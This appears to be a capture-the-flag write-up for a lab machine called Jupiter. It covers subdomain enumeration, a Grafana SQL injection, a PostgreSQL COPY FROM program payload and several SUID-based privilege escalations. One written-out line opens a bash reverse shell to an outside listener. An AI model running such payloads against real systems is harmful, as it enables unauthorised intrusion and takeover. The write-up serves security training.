# Jupiter

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.229.15
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 22:20 EDT
Nmap scan report for 10.129.229.15
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `jupiter.htb` to our `/etc/hosts` file to view port 80.

### Web Enum --> Subdomain&#x20;

The website was a typical corporate site:

<figure><img src="../../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>

There was nothing inherently interesting about the website itself, so I ran a directory and subdomain scan on it. A `wfuzz` subdomain scan found this:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.jupiter.htb" --hc=301 -u http://jupiter.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000001955:   200        211 L    798 W      34390 Ch    "kiosk"                     
```

There's a `kiosk` endpoint. When visited, it shows a Grafana dashboard:

<figure><img src="../../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>

### API SQL Injection

When viewing the traffic in Burp, we can see a lot of requests sent to an `/api` endpoint:

<figure><img src="../../../.gitbook/assets/image (2918).png" alt=""><figcaption></figcaption></figure>

I viewed the requests and found this `query` request:

{% code overflow="wrap" %}
```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 24
x-plugin-id: postgres
Origin: http://kiosk.jupiter.htb
Content-Length: 484
Connection: close



{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":935}],"range":{"from":"2023-06-07T20:30:32.533Z","to":"2023-06-08T02:30:32.534Z","raw":{"from":"now-6h","to":"now"}},"from":"1686169832533","to":"1686191432534"}
```
{% endcode %}

This query was sending a query to the backend database, and it look like it's vulnerable to SQL injection. We can attempt the PostGreSQL RCE exploit, which involves creating a table `cmd_exec`.

<figure><img src="../../../.gitbook/assets/image (2128).png" alt=""><figcaption></figcaption></figure>

Now, we just need to execute a reverse shell with this query:

```sql
COPY cmd_exec FROM program 'bash -c \"bash -i >& /dev/tcp/10.10.14.10/4444 0>&1\"';
```

Then, we would catch a reverse shell on a listener port:

<figure><img src="../../../.gitbook/assets/image (3740).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We are a low privilege user here, so we cannot grab any user flags just yet.&#x20;

### Network Simulation --> RCE

There is something in the machine killing upgraded `pty` shells, and I don't know what. Anyways, I ran a `pspy64` within the machine to find out if any processes were being run as the user.

```
2023/06/08 02:48:01 CMD: UID=1000 PID=1842   | /bin/sh -c /home/juno/shadow-simulation.sh 
2023/06/08 02:48:01 CMD: UID=1000 PID=1843   | /bin/bash /home/juno/shadow-simulation.sh 
2023/06/08 02:48:01 CMD: UID=1000 PID=1845   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml                                                                               
2023/06/08 02:48:01 CMD: UID=1000 PID=1848   | 
2023/06/08 02:48:01 CMD: UID=1000 PID=1849   | lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/06/08 02:48:01 CMD: UID=1000 PID=1854   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml                                                                               
2023/06/08 02:48:01 CMD: UID=1000 PID=1855   | /usr/bin/curl -s server 
2023/06/08 02:48:01 CMD: UID=1000 PID=1857   | /usr/bin/curl -s server 
2023/06/08 02:48:01 CMD: UID=1000 PID=1859   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml                                                                               
2023/06/08 02:48:01 CMD: UID=1000 PID=1864   | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
```

There was a `.yml` file being used to run something in the background as the user. Here's the contents of that file:

```yaml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

This file was being used to run some commands, and we have write access over it. As such, we can easily create another one of it that makes an SUID binary as the user. Here's the updated file:

```yaml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/user
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/user
      start_time: 5s
```

We can overwrite the existing file using `wget -O`. Afterwards, we can easily get a user shell:

<figure><img src="../../../.gitbook/assets/image (2712).png" alt=""><figcaption></figcaption></figure>

We can drop our public key into the `authorized_keys` folder to upgrade our shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (1505).png" alt=""><figcaption></figcaption></figure>

### Jupyter --> Jovian Shell

Now, we need to gain access to the other user, which might have other privileges that we need. Running `netstat` shows that there are multiple ports open with possible services:

```
juno@jupiter:/home$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

Port 8888 was a HTTP port, so let's do some `chisel` forwarding. When visited, it shows a Jupyter instance:

<figure><img src="../../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

There was some token required before we could visit the site. Normally, I'd access this through running `jupyter notebook list`, but there are Python errors with this method. So, we would have to find the source of this website instead to either fix the error or view the logs to find a token. A bit of enumeration reveals that the `/opt` directory contains some interesting files:

```
juno@jupiter:/opt$ ls
solar-flares
juno@jupiter:/opt$ cd solar-flares/
juno@jupiter:/opt/solar-flares$ ls
cflares.csv  flares.html   logs     mflares.csv  xflares.csv
flares.csv   flares.ipynb  map.jpg  start.sh
```

We can view the logs to find a token:

```
juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-06-08-18.log
[W 02:18:14.798 NotebookApp] Terminals not available (error was No module named 'terminado')
[I 02:18:14.808 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
[I 02:18:14.808 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 02:18:14.808 NotebookApp] http://localhost:8888/?token=5d042f1b56b6f73ee8b1cfd36114ca073712bab06536ea8b
[I 02:18:14.808 NotebookApp]  or http://127.0.0.1:8888/?token=5d042f1b56b6f73ee8b1cfd36114ca073712bab06536ea8b
[I 02:18:14.808 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
[W 02:18:14.814 NotebookApp] No web browser found: could not locate runnable browser.
[C 02:18:14.814 NotebookApp] 
    
    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-1091-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=5d042f1b56b6f73ee8b1cfd36114ca073712bab06536ea8b
     or http://127.0.0.1:8888/?token=5d042f1b56b6f73ee8b1cfd36114ca073712bab06536ea8b
[I 02:57:59.866 NotebookApp] 302 GET / (127.0.0.1) 0.860000ms
[I 02:59:26.828 NotebookApp] 302 GET / (127.0.0.1) 0.750000ms
[I 02:59:26.864 NotebookApp] 302 GET /tree? (127.0.0.1) 1.470000ms
```

We can visit the site with the `?token` parameter at the end and be brought to a file directory:

<figure><img src="../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

When we click 'New', there's an option to create a new Notebook:

<figure><img src="../../../.gitbook/assets/image (1959).png" alt=""><figcaption></figcaption></figure>

This brings us to what seems to be a Python interpreter:

<figure><img src="../../../.gitbook/assets/image (2952).png" alt=""><figcaption></figcaption></figure>

I simply ran a command to generate another SUID binary on the machine.

<figure><img src="../../../.gitbook/assets/image (1459).png" alt=""><figcaption></figcaption></figure>

This gives us an easy shell as the new user:

<figure><img src="../../../.gitbook/assets/image (3647).png" alt=""><figcaption></figcaption></figure>

We can also get a reverse shell using this method by replacing the command run.&#x20;

<figure><img src="../../../.gitbook/assets/image (2037).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges

First thing we notice is that we are part of the `sudo` group, so I checked our `sudo` privileges first:

```
jovian@jupiter:/opt/solar-flares$ sudo -l
sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

I wasn't sure what this binary did, but we have write access over it for some reason:

```
jovian@jupiter:/opt/solar-flares$ ls -la /usr/local/bin/sattrack
ls -la /usr/local/bin/sattrack
-rwxrwxr-x 1 jovian jovian 1113632 Mar  8 12:07 /usr/local/bin/sattrack
```

We can just overwrite this with `/bin/bash`, and then run it using `sudo` to get an easy root shell.

<figure><img src="../../../.gitbook/assets/image (1784).png" alt=""><figcaption></figcaption></figure>

Rooted!
